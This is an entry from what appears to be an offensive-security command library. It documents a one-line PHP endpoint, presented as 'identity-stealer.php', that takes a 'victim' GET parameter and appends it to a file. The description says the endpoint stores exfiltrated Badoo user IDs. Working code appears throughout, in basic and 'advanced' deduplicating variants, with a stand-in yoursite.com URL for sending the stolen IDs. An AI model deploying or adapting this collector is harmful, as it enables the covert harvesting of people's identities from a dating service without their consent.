---
data: >-
  <?php $user = $_GET['victim']; $fd =
  fopen("badoo-users-interested-in-my-product.txt","a"); fwrite($fd, $user);
  fclose($fd); ?>
tags:
  - storage
  - php
type: command
executor: php
platforms:
  - Web
id: 3b96fc74-6b2d-46a6-83d1-0c18e737d8d9
created_at: '2025-12-14T17:28:52.072Z'
updated_at: '2025-12-14T17:28:52.072Z'
verified: false
validated: true
submitted: true
---
# store-user-id-php

## Command

```php
<?php $user = $_GET['victim']; $fd = fopen("badoo-users-interested-in-my-product.txt","a"); fwrite($fd, $user); fclose($fd); ?>
```

## Description

This PHP script receives a GET parameter 'victim' containing a user ID, opens a text file in append mode, writes the ID, and closes the file. Deploy as a web endpoint to persistently store exfiltrated Badoo user IDs from client-side requests.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| victim | GET parameter with the extracted user ID string | Yes |
| filename | Target file for storage (hardcoded as badoo-users-interested-in-my-product.txt) | Configurable |

## Examples

### Basic Usage

Save as identity-stealer.php and access via http://yoursite.com/identity-stealer.php?victim=12345.

```php
<?php $user = $_GET['victim']; $fd = fopen("users.txt","a"); fwrite($fd, $user . "\n"); fclose($fd); ?>
```

### Advanced Usage

Add logging and deduplication:

```php
<?php $user = $_GET['victim']; if (!empty($user)) { $file = 'users.txt'; $current = file_get_contents($file); if (strpos($current, $user) === false) { file_put_contents($file, $user . "\n", FILE_APPEND); error_log('Stored user: ' . $user); } } ?>
```

## Expected Output

No HTTP response body; the script appends the user ID to the file (e.g., '12345' added to badoo-users-interested-in-my-product.txt). Check file contents post-execution.

## Related

- [[Related Procedure: Store-and-Utilize-Collected-User-IDs]]
